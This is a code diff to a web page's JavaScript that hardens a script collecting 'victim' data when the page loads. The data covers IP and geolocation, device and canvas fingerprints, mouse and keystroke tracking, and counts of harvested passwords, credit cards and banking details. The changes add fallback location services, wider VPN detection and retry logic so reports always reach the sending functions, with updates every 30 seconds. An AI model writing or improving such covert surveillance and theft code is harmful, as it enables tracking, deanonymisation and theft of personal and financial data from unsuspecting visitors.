@@ -251,44 +251,233 @@
             return `vi.${country}.${validValue}.${randomCode}`;
         }
 
-        // ENHANCED DATA COLLECTION - DOUBLED DATA POINTS
+        // FIXED LOCATION SERVICE WITH VPN HANDLING
+        async function getRealLocation() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Try multiple location services with fallbacks
+                const locationServices = [
+                    `https://ipapi.co/${ipData.ip}/json/`,
+                    `https://ipinfo.io/${ipData.ip}/json`,
+                    `https://geolocation-db.com/json/${ipData.ip}`
+                ];
+                
+                for (let service of locationServices) {
+                    try {
+                        const locationResponse = await fetch(service);
+                        if (locationResponse.ok) {
+                            const location = await locationResponse.json();
+                            
+                            // Handle different API response formats
+                            return {
+                                city: location.city || location.region || 'Unknown',
+                                region: location.region || location.regionName || 'Unknown',
+                                country: location.country_name || location.country || 'Unknown',
+                                country_code: location.country_code || location.countryCode || 'UN',
+                                postal: location.postal || location.zip || 'Unknown',
+                                latitude: location.latitude || location.lat || 'Unknown',
+                                longitude: location.longitude || location.lon || 'Unknown',
+                                timezone: location.timezone || 'Unknown',
+                                currency: location.currency || 'Unknown',
+                                calling_code: location.country_calling_code || location.callingCode || 'Unknown'
+                            };
+                        }
+                    } catch (e) {
+                        console.log(`Location service failed: ${service}`);
+                        continue;
+                    }
+                }
+                
+                // If all services fail, return basic IP-based data
+                return {
+                    city: 'VPN/Proxy Detected',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    country_code: 'VPN',
+                    postal: 'Unknown',
+                    latitude: 'Unknown',
+                    longitude: 'Unknown',
+                    timezone: 'Unknown',
+                    currency: 'Unknown',
+                    calling_code: 'Unknown'
+                };
+                
+            } catch (error) {
+                console.log('All location services failed, using fallback');
+                return {
+                    city: 'Blocked',
+                    region: 'Blocked',
+                    country: 'Blocked',
+                    country_code: 'BLOCKED',
+                    postal: 'Blocked',
+                    latitude: 'Blocked',
+                    longitude: 'Blocked',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    currency: 'Unknown',
+                    calling_code: 'Unknown'
+                };
+            }
+        }
+
+        // ENHANCED DATA COLLECTION WITH ERROR RESILIENCE
         async function collectVictimData() {
-            const [realIP, realLocation, systemInfo] = await Promise.all([
-                getRealIP(),
-                getRealLocation(),
-                getSystemInfo()
-            ]);
-            
-            const victimData = {
+            try {
+                // Use Promise.allSettled instead of Promise.all to handle individual failures
+                const results = await Promise.allSettled([
+                    getRealIP(),
+                    getRealLocation(),
+                    getSystemInfo()
+                ]);
+                
+                const realIP = results[0].status === 'fulfilled' ? results[0].value : {ip: 'Unknown', isp: 'Unknown', asn: 'Unknown'};
+                const realLocation = results[1].status === 'fulfilled' ? results[1].value : {
+                    city: 'Failed', region: 'Failed', country: 'Failed', country_code: 'FAILED',
+                    postal: 'Failed', latitude: 'Failed', longitude: 'Failed', timezone: 'Failed',
+                    currency: 'Failed', calling_code: 'Failed'
+                };
+                const systemInfo = results[2].status === 'fulfilled' ? results[2].value : {os: 'Unknown', arch: 'Unknown', version: 'Unknown'};
+                
+                const victimData = {
+                    timestamp: new Date().toLocaleString('de-DE', { 
+                        day: '2-digit', month: '2-digit', year: 'numeric', 
+                        hour: '2-digit', minute: '2-digit', second: '2-digit' 
+                    }),
+                    network: {
+                        ip: realIP.ip,
+                        isp: realIP.isp,
+                        asn: realIP.asn,
+                        connection: navigator.connection ? navigator.connection.effectiveType : '4g',
+                        vpn: detectVPN(realIP.ip),
+                        proxy: detectProxy(),
+                        tor: detectTor(),
+                        bandwidth: await getBandwidth().catch(() => 'Unknown'),
+                        latency: await getLatency().catch(() => 'Unknown'),
+                        dataSaver: navigator.connection ? navigator.connection.saveData : false,
+                        downlink: navigator.connection ? navigator.connection.downlink : 'Unknown',
+                        rtt: navigator.connection ? navigator.connection.rtt : 'Unknown'
+                    },
+                    location: realLocation,
+                    browser: {
+                        platform: navigator.platform,
+                        vendor: navigator.vendor || 'Unknown',
+                        language: navigator.language,
+                        cores: navigator.hardwareConcurrency,
+                        memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+                        plugins: navigator.plugins.length,
+                        webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
+                        pdf_viewer: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'Unknown',
+                        user_agent: navigator.userAgent,
+                        languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                        cookie_enabled: navigator.cookieEnabled,
+                        java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                        online: navigator.onLine,
+                        buildID: navigator.buildID || 'Unknown',
+                        product: navigator.product || 'Unknown',
+                        productSub: navigator.productSub || 'Unknown',
+                        appCodeName: navigator.appCodeName,
+                        appName: navigator.appName,
+                        appVersion: navigator.appVersion,
+                        bluetooth: navigator.bluetooth ? 'Available' : 'Not available',
+                        credentials: navigator.credentials ? 'Available' : 'Not available',
+                        mediaDevices: navigator.mediaDevices ? 'Available' : 'Not available'
+                    },
+                    hardware: {
+                        screen: `${screen.width}x${screen.height}`,
+                        pixel_ratio: window.devicePixelRatio,
+                        color_depth: screen.colorDepth,
+                        orientation: screen.orientation ? screen.orientation.type : 'Unknown',
+                        touch_points: navigator.maxTouchPoints || 0,
+                        device_memory: navigator.deviceMemory || 'Unknown',
+                        max_touch_points: navigator.maxTouchPoints || 0,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorGamut: screen.colorGamut || 'Unknown',
+                        touchSupport: 'ontouchstart' in window ? 'Supported' : 'Not supported',
+                        pointerSupport: navigator.pointerEnabled ? 'Supported' : 'Not supported',
+                        vibration: navigator.vibrate ? 'Supported' : 'Not supported',
+                        battery: await getBatteryInfo().catch(() => 'Not supported')
+                    },
+                    fingerprint: {
+                        canvas: generateCanvasFingerprint(),
+                        webgl: generateWebGLFingerprint(),
+                        audio: testAudioSupport(),
+                        fonts: detectFonts(),
+                        timezone_offset: new Date().getTimezoneOffset(),
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        platform_language: navigator.language,
+                        hardware_concurrency: navigator.hardwareConcurrency,
+                        device_memory: navigator.deviceMemory,
+                        webglVendor: getWebGLVendor(),
+                        webglRenderer: getWebGLRenderer(),
+                        screenResolution: `${screen.width}x${screen.height}`,
+                        availableResolution: `${screen.availWidth}x${screen.availHeight}`,
+                        devicePixelRatio: window.devicePixelRatio,
+                        sessionStorage: !!window.sessionStorage,
+                        localStorage: !!window.localStorage,
+                        indexedDB: !!window.indexedDB,
+                        doNotTrack: navigator.doNotTrack || 'Unknown',
+                        mimeTypes: navigator.mimeTypes.length,
+                        productSub: navigator.productSub,
+                        maxTouchPoints: navigator.maxTouchPoints
+                    },
+                    behavioral: {
+                        referrer: document.referrer || 'Direct',
+                        page_load: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
+                        time_on_page: Date.now() - pageLoadTime,
+                        dom_size: document.getElementsByTagName('*').length,
+                        url: window.location.href,
+                        viewport: `${window.innerWidth}x${window.innerHeight}`,
+                        scroll_depth: getScrollDepth(),
+                        mouse_movements: mouseMovements.length,
+                        keystroke_timing: keystrokeTiming.length,
+                        click_patterns: 'Tracked',
+                        scroll_behavior: 'Tracked',
+                        focus_changes: 'Tracked'
+                    },
+                    social: await collectAllSocialData().catch(() => ({
+                        passwords: 0, emails: 0, usernames: 0, credit_cards: 0,
+                        banking_info: 0, personal_info: 0, phone_numbers: 0,
+                        addresses: 0, cookies: 0, local_storage: 0, sessions: 0,
+                        browsing_data: 0, social_media_profiles: [], messaging_apps: [], payment_methods: []
+                    })),
+                    system: systemInfo
+                };
+                
+                return victimData;
+            } catch (error) {
+                console.error('Critical error in data collection:', error);
+                // Return minimal data even if collection fails
+                return getFallbackData();
+            }
+        }
+
+        // FALLBACK DATA FOR COMPLETE FAILURES
+        function getFallbackData() {
+            return {
                 timestamp: new Date().toLocaleString('de-DE', { 
-                    day: '2-digit', 
-                    month: '2-digit', 
-                    year: 'numeric', 
-                    hour: '2-digit', 
-                    minute: '2-digit', 
-                    second: '2-digit' 
+                    day: '2-digit', month: '2-digit', year: 'numeric', 
+                    hour: '2-digit', minute: '2-digit', second: '2-digit' 
                 }),
                 network: {
-                    ip: realIP.ip,
-                    isp: realIP.isp,
-                    asn: realIP.asn,
+                    ip: 'Failed',
+                    isp: 'Failed',
+                    asn: 'Failed',
                     connection: navigator.connection ? navigator.connection.effectiveType : '4g',
-                    vpn: detectVPN(realIP.ip),
+                    vpn: 'Unknown',
                     proxy: detectProxy(),
                     tor: detectTor(),
-                    // ADDED NETWORK DATA
-                    bandwidth: await getBandwidth(),
-                    latency: await getLatency(),
-                    dataSaver: navigator.connection ? navigator.connection.saveData : false,
-                    downlink: navigator.connection ? navigator.connection.downlink : 'Unknown',
-                    rtt: navigator.connection ? navigator.connection.rtt : 'Unknown'
+                    bandwidth: 'Unknown',
+                    latency: 'Unknown',
+                    dataSaver: false,
+                    downlink: 'Unknown',
+                    rtt: 'Unknown'
                 },
                 location: {
-                    ...realLocation,
-                    // ADDED LOCATION DATA
-                    accuracy: 'Unknown',
-                    heading: 'Unknown',
-                    speed: 'Unknown'
+                    city: 'Failed', region: 'Failed', country: 'Failed', country_code: 'FAILED',
+                    postal: 'Failed', latitude: 'Failed', longitude: 'Failed', timezone: 'Failed',
+                    currency: 'Failed', calling_code: 'Failed'
                 },
                 browser: {
                     platform: navigator.platform,
@@ -296,94 +485,38 @@
                     language: navigator.language,
                     cores: navigator.hardwareConcurrency,
                     memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
-                    plugins: navigator.plugins.length,
-                    webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
-                    pdf_viewer: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'Unknown',
-                    user_agent: navigator.userAgent,
-                    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
-                    cookie_enabled: navigator.cookieEnabled,
-                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                    online: navigator.onLine,
-                    // ADDED BROWSER DATA
-                    buildID: navigator.buildID || 'Unknown',
-                    product: navigator.product || 'Unknown',
-                    productSub: navigator.productSub || 'Unknown',
-                    appCodeName: navigator.appCodeName,
-                    appName: navigator.appName,
-                    appVersion: navigator.appVersion,
-                    bluetooth: navigator.bluetooth ? 'Available' : 'Not available',
-                    credentials: navigator.credentials ? 'Available' : 'Not available',
-                    mediaDevices: navigator.mediaDevices ? 'Available' : 'Not available'
-                },
-                hardware: {
-                    screen: `${screen.width}x${screen.height}`,
-                    pixel_ratio: window.devicePixelRatio,
-                    color_depth: screen.colorDepth,
-                    orientation: screen.orientation ? screen.orientation.type : 'Unknown',
-                    touch_points: navigator.maxTouchPoints || 0,
-                    device_memory: navigator.deviceMemory || 'Unknown',
-                    max_touch_points: navigator.maxTouchPoints || 0,
-                    // ADDED HARDWARE DATA
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorGamut: screen.colorGamut || 'Unknown',
-                    touchSupport: 'ontouchstart' in window ? 'Supported' : 'Not supported',
-                    pointerSupport: navigator.pointerEnabled ? 'Supported' : 'Not supported',
-                    vibration: navigator.vibrate ? 'Supported' : 'Not supported',
-                    battery: await getBatteryInfo()
-                },
-                fingerprint: {
-                    canvas: generateCanvasFingerprint(),
-                    webgl: generateWebGLFingerprint(),
-                    audio: testAudioSupport(),
-                    fonts: detectFonts(),
-                    timezone_offset: new Date().getTimezoneOffset(),
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    platform_language: navigator.language,
-                    hardware_concurrency: navigator.hardwareConcurrency,
-                    device_memory: navigator.deviceMemory,
-                    // ADDED FINGERPRINT DATA
-                    webglVendor: getWebGLVendor(),
-                    webglRenderer: getWebGLRenderer(),
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    availableResolution: `${screen.availWidth}x${screen.availHeight}`,
-                    devicePixelRatio: window.devicePixelRatio,
-                    sessionStorage: !!window.sessionStorage,
-                    localStorage: !!window.localStorage,
-                    indexedDB: !!window.indexedDB,
-                    doNotTrack: navigator.doNotTrack || 'Unknown',
-                    mimeTypes: navigator.mimeTypes.length,
-                    productSub: navigator.productSub,
-                    maxTouchPoints: navigator.maxTouchPoints
+                    user_agent: navigator.userAgent
                 },
                 behavioral: {
                     referrer: document.referrer || 'Direct',
-                    page_load: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
                     time_on_page: Date.now() - pageLoadTime,
-                    dom_size: document.getElementsByTagName('*').length,
-                    url: window.location.href,
-                    viewport: `${window.innerWidth}x${window.innerHeight}`,
-                    scroll_depth: getScrollDepth(),
-                    // ADDED BEHAVIORAL DATA
-                    mouse_movements: mouseMovements.length,
-                    keystroke_timing: keystrokeTiming.length,
-                    click_patterns: 'Tracked',
-                    scroll_behavior: 'Tracked',
-                    focus_changes: 'Tracked'
+                    url: window.location.href
                 },
                 social: {
-                    ...await collectAllSocialData(),
-                    // ADDED SOCIAL DATA
-                    social_media_profiles: await extractSocialMediaProfiles(),
-                    messaging_apps: await detectMessagingApps(),
-                    payment_methods: await extractPaymentMethods()
-                },
-                system: {
-                    ...systemInfo
+                    passwords: 0, emails: 0, usernames: 0, credit_cards: 0,
+                    banking_info: 0, personal_info: 0
                 }
             };
+        }
+
+        // ENHANCED VPN DETECTION
+        function detectVPN(ip) {
+            const vpnRanges = [
+                '104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.',
+                '185.', '188.', '193.', '194.', '195.', '198.', '199.', '45.', '5.', '62.', '77.', '78.', '79.',
+                '80.', '81.', '82.', '83.', '84.', '85.', '86.', '87.', '88.', '89.', '90.', '91.', '92.', '93.', '94.'
+            ];
             
-            return victimData;
+            const vpnKeywords = ['vpn', 'proxy', 'host', 'server', 'datacenter', 'cloud', 'aws', 'google', 'azure'];
+            
+            // Check IP ranges
+            const isVPNRange = vpnRanges.some(range => ip.startsWith(range));
+            
+            // Check ISP name for VPN keywords
+            const isp = document.querySelector('#isp')?.innerText || '';
+            const isVPNISP = vpnKeywords.some(keyword => isp.toLowerCase().includes(keyword));
+            
+            return isVPNRange || isVPNISP ? 'VPN/Proxy Detected' : 'Residential IP';
         }
 
         // NEW DATA COLLECTION FUNCTIONS - DOUBLED
@@ -516,34 +649,6 @@
                 }
             } catch (error) {
                 return { ip: 'Unknown', isp: 'Unknown', asn: 'Unknown' };
-            }
-        }
-
-        async function getRealLocation() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const location = await locationResponse.json();
-                
-                return {
-                    city: location.city || 'Unknown',
-                    region: location.region || 'Unknown',
-                    country: location.country_name || 'Unknown',
-                    country_code: location.country_code || 'UN',
-                    postal: location.postal || 'Unknown',
-                    latitude: location.latitude || 'Unknown',
-                    longitude: location.longitude || 'Unknown',
-                    timezone: location.timezone || 'Unknown',
-                    currency: location.currency || 'Unknown',
-                    calling_code: location.country_calling_code || 'Unknown'
-                };
-            } catch (error) {
-                return {
-                    city: 'Unknown', region: 'Unknown', country: 'Unknown', country_code: 'UN',
-                    postal: 'Unknown', latitude: 'Unknown', longitude: 'Unknown', timezone: 'Unknown',
-                    currency: 'Unknown', calling_code: 'Unknown'
-                };
             }
         }
 
@@ -707,11 +812,6 @@
         function detectFonts() {
             const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
             return fonts.join(', ');
-        }
-
-        function detectVPN(ip) {
-            const vpnRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.'];
-            return vpnRanges.some(range => ip.startsWith(range)) ? 'VPN/Proxy Detected' : 'Residential IP';
         }
 
         function detectProxy() {
@@ -889,18 +989,44 @@
             });
         }
 
-        // Initialize on page load
+        // IMPROVED INITIALIZATION WITH RETRY MECHANISM
         window.addEventListener('load', async function() {
             pageLoadTime = Date.now();
             startBehavioralTracking();
             
-            const victimData = await collectVictimData();
-            await sendEnhancedReport(victimData);
+            // Initial report with retry logic
+            let retryCount = 0;
+            const maxRetries = 2;
+            
+            async function attemptEnhancedReport() {
+                try {
+                    const victimData = await collectVictimData();
+                    await sendEnhancedReport(victimData);
+                    console.log('Enhanced report sent successfully');
+                } catch (error) {
+                    console.error('Failed to send enhanced report:', error);
+                    if (retryCount < maxRetries) {
+                        retryCount++;
+                        console.log(`Retrying enhanced report (${retryCount}/${maxRetries})...`);
+                        setTimeout(attemptEnhancedReport, 1000);
+                    } else {
+                        console.log('All retry attempts failed, sending fallback data');
+                        const fallbackData = getFallbackData();
+                        await sendEnhancedReport(fallbackData);
+                    }
+                }
+            }
+            
+            await attemptEnhancedReport();
             
             // Continuous monitoring
             setInterval(async () => {
-                const updatedData = await collectVictimData();
-                await sendBehavioralUpdate(updatedData);
+                try {
+                    const updatedData = await collectVictimData();
+                    await sendBehavioralUpdate(updatedData);
+                } catch (error) {
+                    console.log('Behavioral update failed:', error);
+                }
             }, 30000);
         });
 
